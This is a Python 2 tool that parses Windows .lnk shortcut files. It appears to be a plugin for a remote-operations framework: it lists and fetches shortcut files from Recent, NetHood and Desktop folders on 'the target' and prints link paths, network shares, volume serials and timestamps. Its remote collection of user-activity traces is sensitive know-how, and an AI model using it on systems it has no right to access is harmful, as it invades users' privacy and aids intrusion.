
import optparse
import os
import struct
import time
import dsz
import ops.cmd
import getutils
__version__ = '1.0'

def main():
    parser = get_option_parser()
    (options, args) = parser.parse_args()
    if ((len(args) < 1) and (not options.all) and (not options.recent_documents) and (not options.nethood) and (not options.desktop)):
        parser.print_help()
        parser.exit(1)
    if options.all:
        lnk_files = _dir_listing(mask='*.lnk')
        for filename in lnk_files:
            remote_lnk_info(filename)
        return
    if options.recent_documents:
        parse_folders_of_type('Recent', options.force_get)
    if options.nethood:
        parse_folders_of_type('NetHood', options.force_get)
    if options.desktop:
        parse_folders_of_type('Desktop', options.force_get)
    for item in args:
        lnk_files = _dir_listing(path=item, mask='*.lnk')
        if (not lnk_files):
            lnk_files = [item]
        else:
            print ''
            prompt_text = ('Found %s lnk files in %s, would you like to get & parse them?' % (len(lnk_files), item))
            if ((not options.force_get) and (not dsz.ui.Prompt(prompt_text, dsz.GOOD))):
                continue
        for filename in lnk_files:
            if filename.lower().endswith('.lnk'):
                remote_lnk_info(filename)

def get_option_parser():
    usage = 'usage: %prog [options] [filename] [directory of files]'
    description = 'Parse the contents of a .lnk file (or folder of .lnks)'
    parser = optparse.OptionParser(usage=usage, version=__version__, description=description)
    parser.disable_interspersed_args()
    parser.add_option('-r', '--recent-documents', action='store_true', default=False, help='Find all Recent document folders and parse the lnk files in those folders')
    parser.add_option('-n', '--nethood', action='store_true', default=False, help='Find all NetHood folders and parse the lnk files in those folders')
    parser.add_option('-d', '--desktop', action='store_true', default=False, help='Find all Desktop folders and parse the lnk files in those folders')
    parser.add_option('-a', '--all', action='store_true', default=False, help='Search for and parse all lnk files on the target')
    parser.add_option('-f', '--force-get', action='store_true', default=False, help="Automatically get lnk files, don't prompt per each folder")
    return parser

def remote_lnk_info(filename, verbose=True):
    result = getutils.wrapget(filename)
    if (not result.successful):
        return None
    lnk_file = LnkParser(result.FullLocalName)
    if verbose:
        _print_lnk_info(lnk_file)
    return lnk_file

def parse_folders_of_type(folder_mask, force=False):
    print ''
    dsz.ui.Echo(("Searching for all '%s' folders..." % folder_mask), dsz.GOOD)
    mask_dirs = _dir_listing(mask=folder_mask, dirsonly=True)
    for directory in mask_dirs:
        lnk_files = _dir_listing(path=directory, mask='*.lnk')
        if (not lnk_files):
            continue
        print ''
        prompt_text = ('Found %s lnk files in %s, would you like to get & parse them?' % (len(lnk_files), directory))
        if ((not force) and (not dsz.ui.Prompt(prompt_text, dsz.GOOD))):
            continue
        for filename in lnk_files:
            remote_lnk_info(filename)

def _dir_listing(path='*', mask='*', recursive=True, dirsonly=False):
    if ((' ' in path) and ('"' not in path)):
        path = (('"' + path) + '"')
    cmd = ops.cmd.getDszCommand('dir', path=path, mask=mask, recursive=recursive, dirsonly=dirsonly)
    obj = cmd.execute()
    if (not cmd.success):
        return []
    files = []
    for dir_item in obj.diritem:
        for file_item in dir_item.fileitem:
            files.append(os.path.join(dir_item.path, file_item.name))
    return files

def _print_lnk_info(lnk_file):
    print ('Local or Network:      %s' % ('Local Volume' if lnk_file.is_local else 'Network Share'))
    print ('Link Target:           %s' % lnk_file.target_filename)
    print ('Volume Type:           %s' % lnk_file.volume_type)
    print ('Volume Label:          %s' % lnk_file.volume_label)
    print ('Volume Serial Number:  %s' % lnk_file.volume_serial_number)
    print ('Relative Path:         %s' % lnk_file.relative_path)
    print ('Command Line:          %s' % lnk_file.command_line)
    print ('Working Directory:     %s' % lnk_file.working_directory)
    print ('Target Creation Time:  %s' % lnk_file.ctime)
    print ('Target Mod Time:       %s' % lnk_file.mtime)
    print ('Target Access Time:    %s' % lnk_file.atime)
    print ('Description:           %s' % lnk_file.description)
    print ''
HEADER_LEN = 76
LNK_HEADER = {'unknown1': [0, 4, '<I'], 'GUID': [4, 20, ''], 'flags': [20, 24, '<I'], 'file_attributes': [24, 28, '<I'], 'ctimeL': [28, 32, '<I'], 'ctimeH': [32, 36, '<I'], 'atimeL': [36, 40, '<I'], 'atimeH': [40, 44, '<I'], 'mtimeL': [44, 48, '<I'], 'mtimeH': [48, 52, '<I'], 'file_length': [52, 56, '<I'], 'icon_number': [56, 60, '<I'], 'show_wnd': [60, 64, '<I'], 'hot_key': [64, 68, '<I'], 'unknown2': [68, 76, '']}
NET_VOL_TBL = {'size': [0, 4, '<I', 'Size: '], 'uknown1': [4, 8, '<I', ''], 'net_sharename_offset': [8, 12, '<I', ''], 'unknown2': [12, 16, '<I', ''], 'unknown3': [16, 20, '<I', ''], 'net_sharename': [20, '', '', 'Network Sharename: ']}
LOCAL_VOL_TBL = {'size': [0, 4, '<I'], 'vol_type': [4, 8, '<I'], 'vol_serial_num': [8, 12, '<I'], 'volume_name_offset': [12, 16, '<I'], 'volume_label': [16, '', '']}
FILE_LOC_HEADER_SIZE = 28
FILE_LOC_HEADER = {'size': [0, 4, '<I'], 'first_entry': [4, 8, '<I'], 'flags': [8, 12, '<I'], 'local_vol_info_offset': [12, 16, '<I'], 'local_base_path_offset': [16, 20, '<I'], 'net_vol_info_offset': [20, 24, '<I'], 'remain_pathname_offset': [24, 28, '<I']}
FILE_ATTRIBUTES = ['Read Only', 'Hidden', 'System File', 'Volume Label', 'Directory', 'Modified Since Last Backup', 'Encrypted (NTFS Partitions)', 'Normal', 'Temporary', 'Sparse File', 'Reparse Point Data', 'Compressed', 'Offline']
SHOW_WINDOW_STATES = ['Normal', 'Hidden', 'Minimized', 'Maximized']
VOLUME_TYPE = ['No root directory', 'Removable (Floppy, Zip, etc..)', 'Fixed (Hard Disk)', 'Remote (Network Drive)', 'CD-ROM', 'Ram drive']

def parse_structured_data(raw_data, data_format):
    parsed_data = {}
    BEGIN = 0
    END = 1
    CONV = 2
    for key in data_format.keys():
        key_format = data_format[key]
        if (key_format[END] == ''):
            key_format[END] = (key_format[BEGIN] + len(raw_data))
        txt = raw_data[key_format[BEGIN]:key_format[END]]
        if (len(key_format[CONV]) > 0):
            parsed_data[key] = struct.unpack(key_format[CONV], txt)[0]
        else:
            parsed_data[key] = txt
    return parsed_data

def process_volume_table(raw_data, info_offset, parse_dict):
    txt = raw_data[info_offset:(info_offset + 4)]
    size = struct.unpack('<I', txt)[0]
    vol_tbl_raw = raw_data[info_offset:(info_offset + size)]
    return parse_structured_data(vol_tbl_raw, parse_dict)

def conv_time(low, high):
    epoch = 116444736000000000L
    if ((low + high) != 0):
        new_time = ((((long(high) << 32) + long(low)) - epoch) / 10000000)
    else:
        new_time = 0
    return time.strftime('%Y/%m/%d %H:%M:%S %a', time.localtime(new_time))

class LnkParser:

    def __init__(self, file_name=None):
        self.is_local = False
        self.target_filename = None
        self.volume_type = None
        self.volume_label = None
        self.volume_serial_number = None
        self.relative_path = None
        self.command_line = None
        self.working_directory = None
        self.ctime = None
        self.mtime = None
        self.atime = None
        self.description = None
        self.icon_filename = None
        self.file_attributes = None
        self.header = None
        self.file_length = None
        self.icon_number = None
        self.shell_item_id_list = None
        self.file_loc = None
        self.hot_key = None
        self.target_type = None
        self.show_window = None
        if file_name:
            self.parse(file_name)

    def parse(self, file_name):
        file_handle = open(file_name, 'rb')
        header_raw = file_handle.read(HEADER_LEN)
        self.header = parse_structured_data(header_raw, LNK_HEADER)
        if ((self.header['flags'] & 2) > 0):
            self.target_type = 'File or Directory'
        else:
            self.target_type = 'Unknown'
        self.file_attributes = []
        for index in range(len(FILE_ATTRIBUTES)):
            if ((self.header['file_attributes'] & (2 ** index)) > 0):
                self.file_attributes.append(FILE_ATTRIBUTES[index])
        self.ctime = conv_time(int(self.header['ctimeL']), int(self.header['ctimeH']))
        self.mtime = conv_time(int(self.header['mtimeL']), int(self.header['mtimeH']))
        self.atime = conv_time(int(self.header['atimeL']), int(self.header['atimeH']))
        self.file_length = self.header['file_length']
        self.icon_number = self.header['icon_number']
        self.show_window = []
        for index in range(len(SHOW_WINDOW_STATES)):
            if ((self.header['show_wnd'] & (2 ** index)) > 0):
                self.show_window.append(SHOW_WINDOW_STATES[index])
        self.hot_key = str(hex(self.header['hot_key']))
        self.shell_item_id_list = self._get_val(file_handle, 1, 1)
        if ((int(self.header['flags']) & 2) > 0):
            txt = file_handle.read(4)
            self.file_loc = {}
            self.file_loc['size'] = struct.unpack('<I', txt)[0]
            file_loc_raw = (txt + file_handle.read((self.file_loc['size'] - 4)))
            self.file_loc = parse_structured_data(file_loc_raw, FILE_LOC_HEADER)
            offset = self.file_loc['remain_pathname_offset']
            remaining_pathname = ' '.join(file_loc_raw[offset:].split('\x00'))
            self.file_loc['remaining_pathname'] = remaining_pathname.strip()
            if ((self.file_loc['flags'] & 1) > 0):
                local_vol_table = process_volume_table(file_loc_raw, self.file_loc['local_vol_info_offset'], LOCAL_VOL_TBL)
                self.file_loc['local_vol_table'] = local_vol_table
                offset = self.file_loc['local_base_path_offset']
                self.file_loc['base_pathname'] = ' '.join(file_loc_raw[offset:].split('\x00'))
                self.is_local = True
                self.target_filename = self.file_loc['base_pathname']
                if self.file_loc['remaining_pathname']:
                    self.target_filename += '\\'
                    self.target_filename += self.file_loc['remaining_pathname']
                self.volume_type = VOLUME_TYPE[(local_vol_table['vol_type'] - 1)]
                self.volume_label = local_vol_table['volume_label']
                self.volume_serial_number = str(local_vol_table['vol_serial_num'])
            else:
                self.file_loc['local_vol_table'] = None
            if ((self.file_loc['flags'] & 2) > 0):
                net_vol_table = process_volume_table(file_loc_raw, self.file_loc['net_vol_info_offset'], NET_VOL_TBL)
                share_names = net_vol_table['net_sharename'].split('\x00')
                net_vol_table['net_sharename'] = ('(%s) %s' % (share_names[0], share_names[1]))
                self.file_loc['net_vol_table'] = net_vol_table
                self.is_local = False
                self.volume_type = 'N/A'
                self.volume_label = 'N/A'
                self.volume_serial_number = 'N/A'
                self.target_filename = net_vol_table['net_sharename']
                if self.file_loc['remaining_pathname']:
                    self.target_filename += '\\'
                    self.target_filename += self.file_loc['remaining_pathname']
            else:
                self.file_loc['net_vol_table'] = None
        self.description = self._get_val(file_handle, 4, 2)
        self.relative_path = self._get_val(file_handle, 8, 2)
        self.working_directory = self._get_val(file_handle, 16, 2)
        self.command_line = self._get_val(file_handle, 32, 2)
        self.icon_filename = self._get_val(file_handle, 64, 2)

    def _get_val(self, file_handle, mask, size):
        if ((int(self.header['flags']) & mask) <= 0):
            return
        txt = file_handle.read(2)
        length = struct.unpack('<H', txt)[0]
        length = (length * size)
        data = file_handle.read(length)
        if (size == 2):
            data = data.decode('UTF-16-LE', 'replace')
        return data
if (__name__ == '__main__'):
    main()